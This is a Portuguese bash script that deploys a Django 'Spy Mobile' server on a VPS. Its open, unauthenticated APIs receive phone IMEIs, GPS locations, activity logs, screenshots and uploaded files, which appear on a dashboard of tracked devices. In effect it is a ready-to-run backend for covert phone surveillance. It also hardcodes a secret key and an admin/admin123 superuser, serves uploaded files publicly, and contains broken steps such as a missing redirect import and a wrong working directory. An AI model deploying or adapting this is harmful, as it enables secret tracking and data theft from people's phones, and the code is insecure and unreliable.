#!/bin/bash
# 🔒 SETUP COMPLETO DJANGO COM HTTPS NA VPS
# Execute na VPS: 147.79.111.118

echo "🚀 CONFIGURANDO DJANGO COM HTTPS NA VPS"
echo "======================================="

# 1. Atualizar sistema
echo "📦 Atualizando sistema..."
apt update && apt upgrade -y

# 2. Instalar dependências
echo "📦 Instalando dependências..."
apt install -y python3 python3-pip python3-venv nginx supervisor certbot python3-certbot-nginx

# 3. Criar estrutura do projeto
echo "📁 Criando estrutura..."
mkdir -p /var/www/spy
cd /var/www/spy

# 4. Ambiente virtual
echo "🐍 Configurando Python..."
python3 -m venv venv
source venv/bin/activate
pip install django requests gunicorn

# 5. Criar projeto Django completo
echo "🏗️ Criando projeto Django..."
django-admin startproject spy .
cd spy
python manage.py startapp monitoramento

# 6. Configurar settings.py para produção
echo "⚙️ Configurando settings.py..."
cat > spy/settings.py << 'EOF'
import os
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = 'spy-mobile-production-key-change-me'

DEBUG = False

ALLOWED_HOSTS = ['147.79.111.118', 'spy.irod-ti.com', 'localhost']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'monitoramento',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'spy.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'spy.wsgi.application'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
    }
}

LANGUAGE_CODE = 'pt-br'
TIME_ZONE = 'America/Sao_Paulo'
USE_I18N = True
USE_TZ = True

STATIC_URL = '/static/'
STATIC_ROOT = '/var/www/spy/static/'

MEDIA_URL = '/media/'
MEDIA_ROOT = '/var/www/spy/media/'

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

# Configurações de segurança para HTTPS
SECURE_SSL_REDIRECT = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True

CSRF_TRUSTED_ORIGINS = [
    'https://147.79.111.118',
    'http://147.79.111.118',
    'https://spy.irod-ti.com',
    'http://spy.irod-ti.com'
]

# Configurações de upload
FILE_UPLOAD_MAX_MEMORY_SIZE = 50 * 1024 * 1024  # 50MB
DATA_UPLOAD_MAX_MEMORY_SIZE = 50 * 1024 * 1024  # 50MB
EOF

# 7. URLs principais
echo "🔗 Configurando URLs..."
cat > spy/urls.py << 'EOF'
from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', include('monitoramento.urls')),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
EOF

# 8. Models completos
echo "📊 Criando models..."
cat > monitoramento/models.py << 'EOF'
from django.db import models
from django.utils import timezone

class Dispositivo(models.Model):
    imei = models.CharField(max_length=20, unique=True, db_index=True)
    ip = models.GenericIPAddressField()
    nome = models.CharField(max_length=100, blank=True)
    usuario = models.CharField(max_length=100, blank=True)
    modelo = models.CharField(max_length=100, blank=True)
    sistema_operacional = models.CharField(max_length=50, blank=True)
    status = models.CharField(max_length=20, choices=[('ativo', 'Ativo'), ('inativo', 'Inativo')], default='ativo')
    criado_em = models.DateTimeField(auto_now_add=True)
    ultima_conexao = models.DateTimeField(auto_now=True)
    
    # Informações do dispositivo
    bateria_nivel = models.IntegerField(null=True, blank=True)
    bateria_carregando = models.BooleanField(default=False)
    armazenamento_total = models.BigIntegerField(null=True, blank=True)
    armazenamento_usado = models.BigIntegerField(null=True, blank=True)
    
    class Meta:
        ordering = ['-ultima_conexao']
        
    def __str__(self):
        return f"{self.nome or self.imei} ({self.ip})"

class Atividade(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='atividades')
    descricao = models.TextField()
    tipo = models.CharField(max_length=50, default='geral')
    data_hora = models.DateTimeField(auto_now_add=True, db_index=True)
    
    class Meta:
        ordering = ['-data_hora']
        
    def __str__(self):
        return f"{self.dispositivo} - {self.data_hora}"

class Localizacao(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='localizacoes')
    latitude = models.FloatField()
    longitude = models.FloatField()
    precisao = models.FloatField(null=True, blank=True)
    data_hora = models.DateTimeField(auto_now_add=True, db_index=True)
    
    class Meta:
        ordering = ['-data_hora']
        
    def __str__(self):
        return f"{self.dispositivo} - {self.latitude}, {self.longitude}"

class Arquivo(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='arquivos')
    nome_arquivo = models.CharField(max_length=255)
    tipo_arquivo = models.CharField(max_length=50)
    tamanho = models.BigIntegerField()
    arquivo = models.FileField(upload_to='uploads/%Y/%m/%d/')
    data_upload = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-data_upload']
        
    def __str__(self):
        return f"{self.nome_arquivo}"
EOF

# 9. Views completas com todas as APIs
echo "👁️ Criando views..."
cat > monitoramento/views.py << 'EOF'
import json
import os
from django.http import JsonResponse, HttpResponse
from django.shortcuts import render, get_object_or_404
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login
from django.core.files.storage import default_storage
from .models import Dispositivo, Atividade, Localizacao, Arquivo
from django.utils import timezone
from datetime import datetime, timedelta

# APIs para dispositivos móveis
@csrf_exempt
@require_http_methods(["GET"])
def api_test(request):
    return JsonResponse({
        'status': 'success', 
        'message': 'Spy Mobile VPS HTTPS OK!',
        'timestamp': timezone.now().isoformat(),
        'server': '147.79.111.118'
    })

@csrf_exempt
@require_http_methods(["POST"])
def api_atividade(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        descricao = data.get('descricao', 'Atividade automática')
        tipo = data.get('tipo', 'geral')
        
        # Buscar ou criar dispositivo
        dispositivo, created = Dispositivo.objects.get_or_create(
            imei=imei,
            defaults={
                'ip': request.META.get('REMOTE_ADDR', '0.0.0.0'),
                'nome': f'Dispositivo {imei[:8]}',
                'status': 'ativo'
            }
        )
        
        # Atualizar última conexão
        dispositivo.ultima_conexao = timezone.now()
        dispositivo.save()
        
        # Criar atividade
        Atividade.objects.create(
            dispositivo=dispositivo,
            descricao=descricao,
            tipo=tipo
        )
        
        return JsonResponse({'status': 'success', 'device_id': dispositivo.id})
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_localizacao(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        precisao = data.get('precisao')
        
        if not latitude or not longitude:
            return JsonResponse({'error': 'Latitude e longitude são obrigatórias'}, status=400)
        
        # Buscar ou criar dispositivo
        dispositivo, created = Dispositivo.objects.get_or_create(
            imei=imei,
            defaults={
                'ip': request.META.get('REMOTE_ADDR', '0.0.0.0'),
                'nome': f'Dispositivo {imei[:8]}'
            }
        )
        
        # Criar localização
        Localizacao.objects.create(
            dispositivo=dispositivo,
            latitude=float(latitude),
            longitude=float(longitude),
            precisao=float(precisao) if precisao else None
        )
        
        return JsonResponse({'status': 'success'})
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_upload(request):
    try:
        if 'arquivo' not in request.FILES and 'screenshot' not in request.FILES:
            return JsonResponse({'error': 'Nenhum arquivo enviado'}, status=400)
        
        file = request.FILES.get('arquivo') or request.FILES.get('screenshot')
        imei = request.POST.get('imei', 'dispositivo_desconhecido')
        tipo = request.POST.get('tipo', 'arquivo')
        
        # Buscar ou criar dispositivo
        dispositivo, created = Dispositivo.objects.get_or_create(
            imei=imei,
            defaults={
                'ip': request.META.get('REMOTE_ADDR', '0.0.0.0'),
                'nome': f'Dispositivo {imei[:8]}'
            }
        )
        
        # Salvar arquivo
        arquivo_obj = Arquivo.objects.create(
            dispositivo=dispositivo,
            nome_arquivo=file.name,
            tipo_arquivo=tipo,
            tamanho=file.size,
            arquivo=file
        )
        
        return JsonResponse({
            'status': 'success',
            'arquivo_id': arquivo_obj.id,
            'url': arquivo_obj.arquivo.url
        })
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
@require_http_methods(["POST"])
def api_device_info(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        device_info = data.get('device_info', {})
        
        # Buscar ou criar dispositivo
        dispositivo, created = Dispositivo.objects.get_or_create(
            imei=imei,
            defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
        )
        
        # Atualizar informações do dispositivo
        if 'bateria_nivel' in device_info:
            dispositivo.bateria_nivel = device_info['bateria_nivel']
        if 'bateria_carregando' in device_info:
            dispositivo.bateria_carregando = device_info['bateria_carregando']
        if 'armazenamento_total' in device_info:
            dispositivo.armazenamento_total = device_info['armazenamento_total']
        if 'armazenamento_usado' in device_info:
            dispositivo.armazenamento_usado = device_info['armazenamento_usado']
        if 'modelo' in device_info:
            dispositivo.modelo = device_info['modelo']
        if 'sistema_operacional' in device_info:
            dispositivo.sistema_operacional = device_info['sistema_operacional']
        
        dispositivo.save()
        
        return JsonResponse({'status': 'success'})
        
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

# Views da interface web
def home(request):
    dispositivos_count = Dispositivo.objects.count()
    atividades_count = Atividade.objects.count()
    localizacoes_count = Localizacao.objects.count()
    
    # Dispositivos ativos (última conexão nas últimas 24h)
    dispositivos_ativos = Dispositivo.objects.filter(
        ultima_conexao__gte=timezone.now() - timedelta(hours=24)
    ).count()
    
    context = {
        'dispositivos_count': dispositivos_count,
        'atividades_count': atividades_count,
        'localizacoes_count': localizacoes_count,
        'dispositivos_ativos': dispositivos_ativos,
    }
    
    return render(request, 'home.html', context)

@login_required
def lista_dispositivos(request):
    dispositivos = Dispositivo.objects.all().order_by('-ultima_conexao')
    return render(request, 'dispositivos.html', {'dispositivos': dispositivos})

@login_required
def detalhes_dispositivo(request, imei):
    dispositivo = get_object_or_404(Dispositivo, imei=imei)
    atividades = dispositivo.atividades.all()[:20]
    localizacoes = dispositivo.localizacoes.all()[:10]
    arquivos = dispositivo.arquivos.all()[:10]
    
    context = {
        'dispositivo': dispositivo,
        'atividades': atividades,
        'localizacoes': localizacoes,
        'arquivos': arquivos,
    }
    
    return render(request, 'detalhes_dispositivo.html', context)

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            return redirect('home')
        else:
            return render(request, 'login.html', {'erro': 'Credenciais inválidas'})
    
    return render(request, 'login.html')
EOF

# 10. URLs da aplicação
echo "🔗 Configurando URLs da app..."
cat > monitoramento/urls.py << 'EOF'
from django.urls import path
from . import views

urlpatterns = [
    # Interface web
    path('', views.home, name='home'),
    path('login/', views.login_view, name='login'),
    path('dispositivos/', views.lista_dispositivos, name='dispositivos'),
    path('dispositivo/<str:imei>/', views.detalhes_dispositivo, name='detalhes_dispositivo'),
    
    # APIs para dispositivos móveis
    path('api/test/', views.api_test, name='api_test'),
    path('api/atividade/', views.api_atividade, name='api_atividade'),
    path('api/localizacao/', views.api_localizacao, name='api_localizacao'),
    path('api/upload/', views.api_upload, name='api_upload'),
    path('api/device-info/', views.api_device_info, name='api_device_info'),
]
EOF

# 11. Criar templates
echo "🎨 Criando templates..."
mkdir -p templates
cat > templates/base.html << 'EOF'
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}Spy Mobile VPS{% endblock %}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #2c3e50; color: white; padding: 15px; margin: -20px -20px 20px -20px; border-radius: 8px 8px 0 0; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-card { background: #3498db; color: white; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-number { font-size: 2em; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #f8f9fa; font-weight: bold; }
        .btn { background: #3498db; color: white; padding: 8px 16px; text-decoration: none; border-radius: 4px; display: inline-block; }
        .btn:hover { background: #2980b9; }
        .status-ativo { color: #27ae60; font-weight: bold; }
        .status-inativo { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Spy Mobile VPS - HTTPS Seguro</h1>
            <p>Sistema de Monitoramento de Dispositivos Móveis</p>
        </div>
        {% block content %}{% endblock %}
    </div>
</body>
</html>
EOF

cat > templates/home.html << 'EOF'
{% extends 'base.html' %}
{% block content %}
<div class="stats">
    <div class="stat-card">
        <div class="stat-number">{{ dispositivos_count }}</div>
        <div>Total de Dispositivos</div>
    </div>
    <div class="stat-card" style="background: #27ae60;">
        <div class="stat-number">{{ dispositivos_ativos }}</div>
        <div>Dispositivos Ativos</div>
    </div>
    <div class="stat-card" style="background: #f39c12;">
        <div class="stat-number">{{ atividades_count }}</div>
        <div>Total de Atividades</div>
    </div>
    <div class="stat-card" style="background: #9b59b6;">
        <div class="stat-number">{{ localizacoes_count }}</div>
        <div>Localizações Registradas</div>
    </div>
</div>

<h2>🚀 Sistema Funcionando com HTTPS!</h2>
<p><strong>✅ API Test:</strong> <a href="/api/test/" target="_blank">https://147.79.111.118/api/test/</a></p>
<p><strong>📱 Dispositivos:</strong> <a href="/dispositivos/" class="btn">Ver Dispositivos</a></p>
<p><strong>🔐 Admin:</strong> <a href="/admin/" class="btn">Painel Admin</a></p>

<h3>📡 Endpoints da API:</h3>
<ul>
    <li><code>POST /api/atividade/</code> - Receber atividades</li>
    <li><code>POST /api/localizacao/</code> - Receber GPS</li>
    <li><code>POST /api/upload/</code> - Receber arquivos</li>
    <li><code>POST /api/device-info/</code> - Informações do dispositivo</li>
</ul>
{% endblock %}
EOF

# 12. Aplicar migrações e criar superusuário
echo "🗄️ Configurando banco de dados..."
python manage.py makemigrations
python manage.py migrate
python manage.py collectstatic --noinput

# Criar superusuário
echo "👤 Criando superusuário..."
echo "from django.contrib.auth.models import User; User.objects.create_superuser('admin', 'admin@spy.com', 'admin123')" | python manage.py shell

# 13. Configurar Gunicorn
echo "🦄 Configurando Gunicorn..."
cat > /etc/supervisor/conf.d/spy.conf << 'EOF'
[program:spy]
command=/var/www/spy/venv/bin/gunicorn --workers 3 --bind 127.0.0.1:8000 spy.wsgi:application
directory=/var/www/spy
user=www-data
autostart=true
autorestart=true
redirect_stderr=true
stdout_logfile=/var/log/spy.log
environment=PATH="/var/www/spy/venv/bin"
EOF

# 14. Configurar Nginx com HTTPS
echo "🌐 Configurando Nginx..."
cat > /etc/nginx/sites-available/spy << 'EOF'
server {
    listen 80;
    server_name 147.79.111.118;
    
    # Redirecionar HTTP para HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name 147.79.111.118;
    
    # Certificados SSL (serão configurados pelo Certbot)
    ssl_certificate /etc/letsencrypt/live/147.79.111.118/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/147.79.111.118/privkey.pem;
    
    # Configurações SSL
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    
    # Headers de segurança
    add_header Strict-Transport-Security "max-age=63072000" always;
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    
    # Proxy para Django
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # Configurações para upload
        client_max_body_size 50M;
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    # Arquivos estáticos
    location /static/ {
        alias /var/www/spy/static/;
        expires 30d;
        add_header Cache-Control "public, immutable";
    }
    
    # Arquivos de mídia
    location /media/ {
        alias /var/www/spy/media/;
        expires 7d;
    }
}
EOF

# 15. Ativar site e ajustar permissões
echo "🔐 Configurando permissões..."
ln -sf /etc/nginx/sites-available/spy /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

chown -R www-data:www-data /var/www/spy
chmod -R 755 /var/www/spy

# 16. Configurar SSL com Certbot
echo "🔒 Configurando SSL..."
certbot --nginx -d 147.79.111.118 --non-interactive --agree-tos --email admin@spy.com

# 17. Configurar firewall
echo "🔥 Configurando firewall..."
ufw allow 22
ufw allow 80
ufw allow 443
ufw --force enable

# 18. Iniciar serviços
echo "🚀 Iniciando serviços..."
systemctl reload supervisor
supervisorctl reread
supervisorctl update
supervisorctl start spy
systemctl restart nginx

# 19. Testar configuração
echo "🧪 Testando configuração..."
sleep 5

# Teste HTTP (deve redirecionar para HTTPS)
echo "Testando HTTP..."
curl -I http://147.79.111.118/api/test/

# Teste HTTPS
echo "Testando HTTPS..."
curl -k https://147.79.111.118/api/test/

echo ""
echo "✅ DJANGO COM HTTPS CONFIGURADO!"
echo "================================"
echo "🌐 Acesse: https://147.79.111.118"
echo "🔐 Admin: https://147.79.111.118/admin/"
echo "🔑 Login: admin / admin123"
echo "📡 API Test: https://147.79.111.118/api/test/"
echo ""
echo "📱 Configure o app para usar: https://147.79.111.118"
echo "🔒 SSL/HTTPS ativo e funcionando!"